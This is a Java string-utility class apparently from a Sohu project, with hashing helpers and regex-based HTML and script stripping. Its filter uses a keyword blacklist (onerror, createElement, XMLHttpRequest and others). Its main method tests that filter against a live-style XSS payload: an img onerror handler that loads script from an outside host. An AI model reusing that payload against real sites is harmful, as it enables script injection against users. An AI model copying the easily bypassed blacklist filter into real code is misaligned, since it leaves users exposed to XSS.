package com.sohu.mp.util;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * User: shunlongli
 * Date: 2010-3-18
 * Time: 17:20:40
 */
public class StringUtils {

    private static final char[] DIGITS = {
            '0', '1', '2', '3', '4', '5', '6', '7',
            '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
    };

    public static String join(Object[] array, String separator) {
        if (array == null) {
            return null;
        }
        int arraySize = array.length;
        StringBuilder buffer = new StringBuilder();

        for (int i = 0; i < arraySize; i++) {
            if (i > 0) {
                buffer.append(separator);
            }
            if (array[i] != null) {
                buffer.append(array[i]);
            }
        }
        return buffer.toString();
    }

    public static String md5Hex(String data) {
        if (data == null) {
            throw new IllegalArgumentException("data must not be null");
        }

        byte[] bytes = digest("MD5", data);

        return toHexString(bytes);
    }

    public static String sha1Hex(String data) {
        if (data == null) {
            throw new IllegalArgumentException("data must not be null");
        }

        byte[] bytes = digest("SHA1", data);

        return toHexString(bytes);
    }
    
    public static String htmlSpecialChars( String s )
    {
      s = s.replaceAll( "&", "&amp;" );
      s = s.replaceAll( "\"", "&quot;" );
      s = s.replaceAll( "<", "&lt;" );
      s = s.replaceAll( ">", "&gt;" );
      return s;
    }
    
    //private static final String regEx_script = "<script[^>]*?>[\\s\\S]*?<\\/script>"; // 定义script的正则表达式
    private static final String regEx_style = "<style[^>]*?>[\\s\\S]*?<\\/style>"; // 定义style的正则表达式
    private static final String regEx_html = "<[^>]+>"; // 定义HTML标签的正则表达式
    private static final String regEx_other = "&\\w*;";
    private static final String regEx_script = "<[\\s]*?script[^>]*>[\\s\\S]*?</script[\\s]*?>"; // 定义script的正则表达式{或<script[^>]*?>[//s//S]*?<///script>
    
    private static final Pattern p_script = Pattern.compile(regEx_script, Pattern.CASE_INSENSITIVE);
    
    public static String delHTMLTag(String htmlStr) {
        Pattern p_script = Pattern.compile(regEx_script, Pattern.CASE_INSENSITIVE);
        Matcher m_script = p_script.matcher(htmlStr);
        htmlStr = m_script.replaceAll(""); // 过滤script标签

        Pattern p_style = Pattern.compile(regEx_style, Pattern.CASE_INSENSITIVE);
        Matcher m_style = p_style.matcher(htmlStr);
        htmlStr = m_style.replaceAll(""); // 过滤style标签

        Pattern p_html = Pattern.compile(regEx_html, Pattern.CASE_INSENSITIVE);
        Matcher m_html = p_html.matcher(htmlStr);
        htmlStr = m_html.replaceAll(""); // 过滤html标签
        
        Pattern p_other = Pattern.compile(regEx_other, Pattern.CASE_INSENSITIVE);
        Matcher m_other = p_other.matcher(htmlStr);
        htmlStr = m_other.replaceAll(""); // 过滤&nbsp;等标签

        return htmlStr.trim(); // 返回文本字符串
    }
    
    
    
    public static String rmScript(String input) {        
        String textStr = "";      
        Matcher m_script; 
/*        java.util.regex.Pattern p_style;      
        java.util.regex.Matcher m_style;      
        java.util.regex.Pattern p_html;      
        java.util.regex.Matcher m_html;      
    
        java.util.regex.Pattern p_html1;      
        java.util.regex.Matcher m_html1; */     
    
       try {      
                  
            //String regEx_style = "<[//s]*?style[^>]*?>[//s//S]*?<[//s]*?///[//s]*?style[//s]*?>"; // 定义style的正则表达式{或<style[^>]*?>[//s//S]*?<///style>      
            //String regEx_html = "<[^>]+>"; // 定义HTML标签的正则表达式      
            //String regEx_html1 = "<[^>]+";      
            m_script = p_script.matcher(input);      
            input = m_script.replaceAll(""); // 过滤script标签     
            
            //black words
            input = input.replaceAll("(?i)onerror", "");
            input = input.replaceAll("(?i)createElement", "");
            input = input.replaceAll("(?i)appendChild","");
            input = input.replaceAll("(?i)script", "");
            input = input.replaceAll("(?i)onload", "");
            input = input.replaceAll("(?i)XMLHttpRequest", "");
    
/*            p_style = Pattern.compile(regEx_style, Pattern.CASE_INSENSITIVE);      
            m_style = p_style.matcher(input);      
            input = m_style.replaceAll(""); // 过滤style标签      
    
            p_html = Pattern.compile(regEx_html, Pattern.CASE_INSENSITIVE);      
            m_html = p_html.matcher(input);      
            input = m_html.replaceAll(""); // 过滤html标签      
    
            p_html1 = Pattern.compile(regEx_html1, Pattern.CASE_INSENSITIVE);      
            m_html1 = p_html1.matcher(input);      
            input = m_html1.replaceAll(""); // 过滤html标签      
*/    
            textStr = input;      
    
        } catch (Exception e) {      
            System.err.println("Html2Text: " + e.getMessage());      
        }      
    
       return textStr;// 返回文本字符串      
    }   
    
    
    private static String toHexString(byte[] bytes) {
        int l = bytes.length;

        char[] out = new char[l << 1];

        for (int i = 0, j = 0; i < l; i++) {
            out[j++] = DIGITS[(0xF0 & bytes[i]) >>> 4];
            out[j++] = DIGITS[0x0F & bytes[i]];
        }

        return new String(out);
    }

    private static byte[] digest(String algorithm, String data) {
        MessageDigest digest;
        try {
            digest = MessageDigest.getInstance(algorithm);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }

        return digest.digest(data.getBytes());
    }
    
    public static void main(String args[]){
    	String testString = "<p><br /><script>sss</SCRIPT>ScRiPTbr /> onLoad,createELEMENT自己的 CMS 版本有更新请尽快更新！</p><p><img/onerror=with(body)appendChild(createElement(/script/.source)).src=alt alt=//qqq.si/Lwwf1G src=xx:x width=0>";
    	String input = rmScript(testString);
    	System.out.println(input);
    }
}
